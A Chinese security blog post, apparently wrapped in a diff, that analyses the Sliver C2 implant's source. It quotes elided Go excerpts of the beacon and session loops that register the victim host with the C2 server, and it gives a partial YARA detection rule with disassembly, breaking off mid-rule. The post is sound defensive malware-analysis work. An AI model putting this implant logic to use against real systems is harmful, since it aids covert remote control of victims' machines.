@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="HaCky的安全备忘录" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Implant上线分析&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sliver的Implant存在两种工作模式，一种是beacon模式，这是一种异步处理模式，Implant收到指令之后，并不会立即执行，而是等待一段时候之后进行处理。另外一种是session立即处理模式。在https://github.com/BishopFox/sliver/blob/master/im">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sliver源码分析">
+<meta property="og:url" content="https://findream.github.io/2023/03/02/Sliver原理分析/index.html">
+<meta property="og:site_name" content="HaCky的安全备忘录">
+<meta property="og:description" content="Implant上线分析&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sliver的Implant存在两种工作模式，一种是beacon模式，这是一种异步处理模式，Implant收到指令之后，并不会立即执行，而是等待一段时候之后进行处理。另外一种是session立即处理模式。在https://github.com/BishopFox/sliver/blob/master/im">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2023-05-03T14:00:56.804Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sliver源码分析">
+<meta name="twitter:description" content="Implant上线分析&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sliver的Implant存在两种工作模式，一种是beacon模式，这是一种异步处理模式，Implant收到指令之后，并不会立即执行，而是等待一段时候之后进行处理。另外一种是session立即处理模式。在https://github.com/BishopFox/sliver/blob/master/im">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findream.github.io/2023/03/02/Sliver原理分析/"/>
+
+
+
+
+
+  <title>Sliver源码分析 | HaCky的安全备忘录</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">HaCky的安全备忘录</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2023/03/02/Sliver原理分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="HaCky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HaCky的安全备忘录">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Sliver源码分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-03-02T20:45:11+08:00">
+                2023-03-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows攻防/" itemprop="url" rel="index">
+                    <span itemprop="name">Windows攻防</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Implant上线分析"><a href="#Implant上线分析" class="headerlink" title="Implant上线分析"></a>Implant上线分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sliver的Implant存在两种工作模式，一种是beacon模式，这是一种异步处理模式，Implant收到指令之后，并不会立即执行，而是等待一段时候之后进行处理。另外一种是session立即处理模式。在<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>的main函数中，分别存在<code>beaconStartup</code>和<code>sessionStartup</code>。<code>beaconStartup</code>对应的是beacon模式，<code>sessionStartup</code>对应的是session模式。</p>
+<a id="more"></a>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">func</span> <span class="selector-tag">main</span>() </div><div class="line">&#123;</div><div class="line">	<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">	<span class="selector-tag">log</span><span class="selector-class">.Printf</span>(<span class="string">"Hello my name is %s"</span>, consts.SliverName)</div><div class="line">	<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">	<span class="selector-tag">limits</span><span class="selector-class">.ExecLimits</span>() <span class="comment">// Check to see if we should execute</span></div><div class="line">	<span class="comment">// &#123;&#123;if .Config.IsService&#125;&#125;</span></div><div class="line">	<span class="selector-tag">svc</span><span class="selector-class">.Run</span>(<span class="string">""</span>, &amp;sliverService&#123;&#125;)</div><div class="line">	<span class="comment">// &#123;&#123;else&#125;&#125;</span></div><div class="line">	<span class="comment">// &#123;&#123;if .Config.IsBeacon&#125;&#125;</span></div><div class="line">	<span class="selector-tag">beaconStartup</span>()</div><div class="line">	<span class="comment">// &#123;&#123;else&#125;&#125; ------- IsBeacon/IsSession -------</span></div><div class="line">	<span class="selector-tag">sessionStartup</span>()</div><div class="line">	<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>sessionStartup</code>中会调用<code>StartConnectionLoop</code>函数创建链接，<code>sessionMainLoop</code>函数进行链接之后的命令处理。而<code>beaconStartup</code>会调用<code>StartBeaconLoop</code>和<code>beaconMainLoop</code>。通过对比<code>sessionMainLoop</code>和<code>StartBeaconLoop</code>两个函数，从代码逻辑上，两者并没有什么区别，从功能来看，两者区别在于通讯协议的处理上。可以看到，在beacon模式下，如果使用mtls协议，调用的是位于<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/beacon.go</code>的<code>mtlsbeacon</code>函数，如果是session协议,则会调用位于<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/session.go</code>的<code>mtlsConnect</code>函数。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//beacon</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartBeaconLoop</span><span class="params">(abort &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> &lt;-<span class="title">chan</span> *<span class="title">Beacon</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[...]</div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">[...]</div><div class="line">		<span class="keyword">for</span> uri := <span class="keyword">range</span> c2Generator &#123;</div><div class="line">			<span class="keyword">switch</span> uri.Scheme &#123;</div><div class="line">			<span class="comment">// *** MTLS ***</span></div><div class="line">			<span class="keyword">case</span> <span class="string">"mtls"</span>:</div><div class="line">				beacon = mtlsBeacon(uri)</div><div class="line">			<span class="keyword">case</span> <span class="string">"wg"</span>:</div><div class="line">				<span class="comment">// *** WG ***</span></div><div class="line">				beacon = wgBeacon(uri)</div><div class="line">[...]</div><div class="line">			&#125;</div><div class="line">[...]</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line">	<span class="keyword">return</span> nextBeacon</div><div class="line">&#125;</div><div class="line"><span class="comment">//session</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartConnectionLoop</span><span class="params">(abort &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> &lt;-<span class="title">chan</span> *<span class="title">Connection</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[...]</div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">[...]</div><div class="line">		<span class="keyword">for</span> uri := <span class="keyword">range</span> c2Generator &#123;</div><div class="line">			<span class="keyword">switch</span> uri.Scheme &#123;</div><div class="line">			<span class="comment">// *** MTLS ***</span></div><div class="line">			<span class="keyword">case</span> <span class="string">"mtls"</span>:</div><div class="line">				connection, err = mtlsConnect(uri)</div><div class="line">[...]</div><div class="line">				&#125;</div><div class="line">			<span class="keyword">case</span> <span class="string">"wg"</span>:</div><div class="line">				<span class="comment">// *** WG ***</span></div><div class="line">				connection, err = wgConnect(uri)</div><div class="line">[...]</div><div class="line">			&#125;</div><div class="line">[...]</div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line">	<span class="keyword">return</span> nextConnection</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在session模式下，<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>的<code>sessionMainLoop</code>方法，整个流程很纯粹就是一个session模式，逻辑也很简单，首先进行链接，然后注册Sliver Implant，也就是将主机信息发送过去，然后获取一些Handle(处理器)。然后接收命令，根据命令的类型，传递给不同的Handle进行处理。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sessionMainLoop</span><span class="params">(connection *transports.Connection)</span> <span class="title">error</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[...]</div><div class="line">	err := connection.Start()</div><div class="line">[...]</div><div class="line">	pivots.RestartAllListeners(connection.Send)</div><div class="line">	<span class="keyword">defer</span> pivots.StopAllListeners()</div><div class="line">	<span class="keyword">defer</span> connection.Stop()</div><div class="line"><span class="comment">//</span></div><div class="line">	connectionErrors = <span class="number">0</span></div><div class="line">	register := registerSliver()</div><div class="line">	register.ActiveC2 = connection.URL()</div><div class="line">	register.ProxyURL = connection.ProxyURL()</div><div class="line">	connection.Send &lt;- wrapEnvelope(sliverpb.MsgRegister, register) <span class="comment">// Send registration information</span></div><div class="line"><span class="comment">//</span></div><div class="line">	pivotHandlers := handlers.GetPivotHandlers()</div><div class="line">	tunHandlers := handlers.GetTunnelHandlers()</div><div class="line">	sysHandlers := handlers.GetSystemHandlers()</div><div class="line">	specialHandlers := handlers.GetSpecialHandlers()</div><div class="line">	rportfwdHandlers := handlers.GetRportFwdHandlers()</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">for</span> envelope := <span class="keyword">range</span> connection.Recv &#123;</div><div class="line">		<span class="keyword">if</span> handler, ok := specialHandlers[envelope.Type]; ok &#123;</div><div class="line">			<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">			log.Printf(<span class="string">"[recv] specialHandler %d"</span>, envelope.Type)</div><div class="line">			<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">			handler(envelope.Data, connection)</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> handler, ok := pivotHandlers[envelope.Type]; ok &#123;</div><div class="line">			<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">			log.Printf(<span class="string">"[recv] pivotHandler with type %d"</span>, envelope.Type)</div><div class="line">			<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">			<span class="keyword">go</span> handler(envelope, connection)</div><div class="line">[...]</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> handler, ok := rportfwdHandlers[envelope.Type]; ok &#123;</div><div class="line">			<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">			log.Printf(<span class="string">"[recv] rportfwdHandler with type %d"</span>, envelope.Type)</div><div class="line">			<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">			<span class="keyword">go</span> handler(envelope, connection)</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> envelope.Type == sliverpb.MsgCloseSession &#123;</div><div class="line">			<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">			log.Printf(<span class="string">"[recv] unknown envelope type %d"</span>, envelope.Type)</div><div class="line">			<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">			connection.Send &lt;- &amp;sliverpb.Envelope&#123;</div><div class="line">				ID:                 envelope.ID,</div><div class="line">				Data:               <span class="literal">nil</span>,</div><div class="line">				UnknownMessageType: <span class="literal">true</span>,</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon模式下，<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>中的<code>beaconMainLoop</code>,可以看到在进行链接，发送注册信息之后，Implant休息了一段时间，之后执行<code>beaconMain</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">beaconMainLoop</span><span class="params">(beacon *transports.Beacon)</span> <span class="title">error</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="comment">// Register beacon</span></div><div class="line">	err := beacon.Init()</div><div class="line">[...]</div><div class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		err := beacon.Cleanup()</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">			log.Printf(<span class="string">"[beacon] cleanup failure %s"</span>, err)</div><div class="line">			<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line">	err = beacon.Start()</div><div class="line">[...]</div><div class="line">	nextCheckin := time.Now().Add(beacon.Duration())</div><div class="line">	register := registerSliver()</div><div class="line">	register.ActiveC2 = beacon.ActiveC2</div><div class="line">	register.ProxyURL = beacon.ProxyURL</div><div class="line">	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &amp;sliverpb.BeaconRegister&#123;</div><div class="line">		ID:          InstanceID,</div><div class="line">		Interval:    beacon.Interval(),</div><div class="line">		Jitter:      beacon.Jitter(),</div><div class="line">		Register:    register,</div><div class="line">		NextCheckin: <span class="keyword">int64</span>(beacon.Duration().Seconds()),</div><div class="line">	&#125;))</div><div class="line">	time.Sleep(time.Second)   <span class="comment">//异步</span></div><div class="line">	beacon.Close()</div><div class="line">[...]</div><div class="line">	<span class="comment">// BeaconMain - Is executed in it's own goroutine as the function will block</span></div><div class="line">	<span class="comment">// until all tasks complete (in success or failure), if a task handler blocks</span></div><div class="line">	<span class="comment">// forever it will simply block this set of tasks instead of the entire beacon</span></div><div class="line">	errors := <span class="built_in">make</span>(<span class="keyword">chan</span> error)</div><div class="line">	shortCircuit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		duration := beacon.Duration()</div><div class="line">		nextCheckin = time.Now().Add(duration)</div><div class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">			oldInterval := beacon.Interval()</div><div class="line">			err := beaconMain(beacon, nextCheckin)   <span class="comment">//主函数</span></div><div class="line">[...]</div><div class="line">		&#125;()</div><div class="line">[...]</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go</code>的registerSliver的作用是收集信息发送给服务端进行Sliver注册。存在一个yara检测点</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">rule rule_sliver</div><div class="line">&#123;</div><div class="line"><span class="symbol">	meta:</span></div><div class="line">		description = <span class="string">"detect sliver implant"</span></div><div class="line">		hash = <span class="string">""</span></div><div class="line"><span class="symbol">	strings:</span></div><div class="line">		$header = &#123;<span class="number">4d</span> 5a&#125;</div><div class="line">		//&amp;sliverpb.Register(main_Register)</div><div class="line">		$hex1 = &#123;<span class="number">89</span> <span class="number">51</span> ?? 8B <span class="number">15</span> ?? ?? ?? ?? <span class="number">8D</span> <span class="number">79</span> ?? <span class="number">85</span> D2 <span class="number">74</span> <span class="number">02</span> EB <span class="number">05</span> <span class="number">89</span> <span class="number">41</span> ?? EB <span class="number">07</span>&#125;</div><div class="line">		//.text:007B6B80 <span class="number">89</span> <span class="number">51</span> <span class="number">30</span>                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">30h</span>], <span class="built_in">edx</span>  <span class="comment">; ----&gt; length of Username</span></div><div class="line">		//.text:007B6B83 8B <span class="number">15</span> <span class="number">00</span> <span class="number">77</span> BB <span class="number">00</span>                       <span class="keyword">mov</span>     <span class="built_in">edx</span>, runtime_writeBarrier</div><div class="line">		//.text:007B6B89 <span class="number">8D</span> <span class="number">79</span> 2C                                <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">ecx</span>+<span class="number">2Ch</span>]</div><div class="line">		//.text:007B6B8C <span class="number">85</span> D2                                   <span class="keyword">test</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">		//.text:007B6B8E <span class="number">74</span> <span class="number">02</span>                                   <span class="keyword">jz</span>      short loc_7B6B92 <span class="comment">; ====&gt;  Username</span></div><div class="line">		//.text:007B6B90 EB <span class="number">05</span>                                   <span class="keyword">jmp</span>     short loc_7B6B97</div><div class="line">		//.text:007B6B92 <span class="number">89</span> <span class="number">41</span> 2C                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">2Ch</span>], <span class="built_in">eax</span>  <span class="comment">; ====&gt;  Username</span></div><div class="line">		//.text:007B6B95 EB <span class="number">07</span>                                   <span class="keyword">jmp</span>     short loc_7B6B9E</div><div class="line">		$hex2 = &#123;C7 <span class="number">41</span> ?? <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 8B <span class="number">15</span> ?? ?? ?? ?? <span class="number">8D</span> <span class="number">79</span> ?? <span class="number">85</span> D2 <span class="number">74</span> <span class="number">02</span> EB <span class="number">0B</span> <span class="number">8D</span> <span class="number">15</span> ?? ?? ?? ?? <span class="number">89</span> <span class="number">51</span> ?? EB <span class="number">0D</span>&#125;</div><div class="line">		//.text:007B6C03 C7 <span class="number">41</span> <span class="number">48</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">48h</span>], <span class="number">7</span> <span class="comment">; ---&gt; length of Os</span></div><div class="line">		//.text:007B6C0A 8B <span class="number">15</span> <span class="number">00</span> <span class="number">77</span> BB <span class="number">00</span>                       <span class="keyword">mov</span>     <span class="built_in">edx</span>, runtime_writeBarrier</div><div class="line">		//.text:007B6C10 <span class="number">8D</span> <span class="number">79</span> <span class="number">44</span>                                <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">ecx</span>+<span class="number">44h</span>]</div><div class="line">		//.text:007B6C13 <span class="number">85</span> D2                                   <span class="keyword">test</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">		//.text:007B6C15 <span class="number">74</span> <span class="number">02</span>                                   <span class="keyword">jz</span>      short loc_7B6C19</div><div class="line">		//.text:007B6C17 EB <span class="number">0B</span>                                   <span class="keyword">jmp</span>     short loc_7B6C24</div><div class="line">		//.text:007B6C19                         <span class="comment">; ---------------------------------------------------------------------------</span></div><div class="line">		//.text:007B6C19</div><div class="line">		//.text:007B6C19                         loc_7B6C19:                             <span class="comment">; CODE XREF: main_registerSliver+685↑j</span></div><div class="line">		//.text:007B6C19 <span class="number">8D</span> <span class="number">15</span> D4 5A <span class="number">87</span> <span class="number">00</span>                       <span class="keyword">lea</span>     <span class="built_in">edx</span>, unk_875AD4</div><div class="line">		//.text:007B6C1F <span class="number">89</span> <span class="number">51</span> <span class="number">44</span>                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">44h</span>], <span class="built_in">edx</span>  <span class="comment">; ====&gt; Os</span></div><div class="line">		//.text:007B6C22 EB <span class="number">0D</span>                                   <span class="keyword">jmp</span>     short loc_7B6C31</div><div class="line">		$hex3 = &#123;C7 <span class="number">41</span> ?? <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 8B <span class="number">15</span> ?? ?? ?? ?? <span class="number">8D</span> <span class="number">79</span> ?? <span class="number">85</span> D2 <span class="number">74</span> <span class="number">02</span> EB <span class="number">0B</span> <span class="number">8D</span> <span class="number">15</span> ?? ?? ?? ?? <span class="number">89</span> <span 